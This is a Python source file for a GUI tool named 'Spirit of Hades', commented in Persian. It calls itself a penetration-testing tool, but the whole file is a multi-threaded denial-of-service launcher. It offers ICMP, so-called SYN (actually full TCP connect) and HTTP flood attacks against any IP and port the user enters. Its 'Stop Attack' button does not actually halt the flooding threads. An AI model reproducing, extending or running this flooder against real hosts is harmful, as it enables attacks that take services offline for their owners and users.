import socket
import random
import time
from threading import Thread
import tkinter as tk
from tkinter import messagebox
import logging
import os
import sys
from scapy.all import IP, ICMP, send

# تنظیمات لاگ‌گیری
logging.basicConfig(filename='spirit_of_hades.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# لیست User-Agent‌ها
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# بنر برنامه
def show_banner():
    banner = """
*******************************************************
*                                                     *
*                  Spirit of Hades                    *
*                                                     *
*   Advanced Penetration Testing and Security Tool    *
*                                                     *
*   Version: 1.0                                      *
*   Developer: KiNG_CYReX                             *
*                                                     *
*******************************************************
    """
    print(banner)

# حمله ICMP Flood (لایه ۳)
def icmp_flood(target_ip):
    while True:
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            logging.info(f"ICMP packet sent to {target_ip}")
        except Exception as e:
            logging.error(f"Failed to send ICMP packet to {target_ip} - {e}")

# حمله SYN Flood (لایه ۴)
def syn_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            logging.info(f"SYN packet sent to {target_ip}:{target_port}")
        except Exception as e:
            logging.error(f"Failed to send SYN packet to {target_ip}:{target_port} - {e}")
        finally:
            s.close()

# حمله HTTP Flood (لایه ۷)
def http_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            user_agent = random.choice(USER_AGENTS)
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            s.send(request.encode())
            logging.info(f"HTTP request sent to {target_ip}:{target_port}")
        except Exception as e:
            logging.error(f"Failed to send HTTP request to {target_ip}:{target_port} - {e}")
        finally:
            s.close()

# رابط گرافیکی
class SpiritOfHadesGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("روح هیدیس (Spirit of Hades)")
        self.root.geometry("500x400")

        # نمایش بنر
        self.banner_label = tk.Label(root, text="روح هیدیس (Spirit of Hades)", font=("Helvetica", 16, "bold"), fg="blue")
        self.banner_label.pack(pady=10)

        self.subtitle_label = tk.Label(root, text="ابزار پیشرفته تست نفوذ و ارزیابی امنیتی", font=("Helvetica", 12))
        self.subtitle_label.pack(pady=5)

        # ورودی‌ها
        self.ip_label = tk.Label(root, text="Target IP:")
        self.ip_label.pack()
        self.ip_entry = tk.Entry(root)
        self.ip_entry.pack()

        self.port_label = tk.Label(root, text="Target Port:")
        self.port_label.pack()
        self.port_entry = tk.Entry(root)
        self.port_entry.pack()

        self.threads_label = tk.Label(root, text="Number of Threads:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(root)
        self.threads_entry.pack()

        # دکمه‌ها
        self.icmp_button = tk.Button(root, text="Start ICMP Flood", command=self.start_icmp_flood)
        self.icmp_button.pack(pady=5)

        self.syn_button = tk.Button(root, text="Start SYN Flood", command=self.start_syn_flood)
        self.syn_button.pack(pady=5)

        self.http_button = tk.Button(root, text="Start HTTP Flood", command=self.start_http_flood)
        self.http_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Attack", command=self.stop_attack)
        self.stop_button.pack(pady=10)

        # وضعیت حمله
        self.status_label = tk.Label(root, text="Status: Idle", fg="green")
        self.status_label.pack()

        # مدیریت نخ‌ها
        self.threads = []

    def start_icmp_flood(self):
        target_ip = self.ip_entry.get()
        num_threads = int(self.threads_entry.get())

        self.status_label.config(text="Status: ICMP Flood Running", fg="red")
        for _ in range(num_threads):
            thread = Thread(target=icmp_flood, args=(target_ip,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def start_syn_flood(self):
        target_ip = self.ip_entry.get()
        target_port = int(self.port_entry.get())
        num_threads = int(self.threads_entry.get())

        self.status_label.config(text="Status: SYN Flood Running", fg="red")
        for _ in range(num_threads):
            thread = Thread(target=syn_flood, args=(target_ip, target_port))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def start_http_flood(self):
        target_ip = self.ip_entry.get()
        target_port = int(self.port_entry.get())
        num_threads = int(self.threads_entry.get())

        self.status_label.config(text="Status: HTTP Flood Running", fg="red")
        for _ in range(num_threads):
            thread = Thread(target=http_flood, args=(target_ip, target_port))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def stop_attack(self):
        for thread in self.threads:
            thread.join(timeout=0.1)
        self.threads.clear()
        self.status_label.config(text="Status: Idle", fg="green")
        messagebox.showinfo("Info", "Attack stopped.")

# اجرای رابط گرافیکی
if __name__ == "__main__":
    # بررسی دسترسی root (برای ارسال بسته‌های ICMP)
    if os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

    # نمایش بنر در کنسول
    show_banner()

    root = tk.Tk()
    app = SpiritOfHadesGUI(root)
    root.mainloop()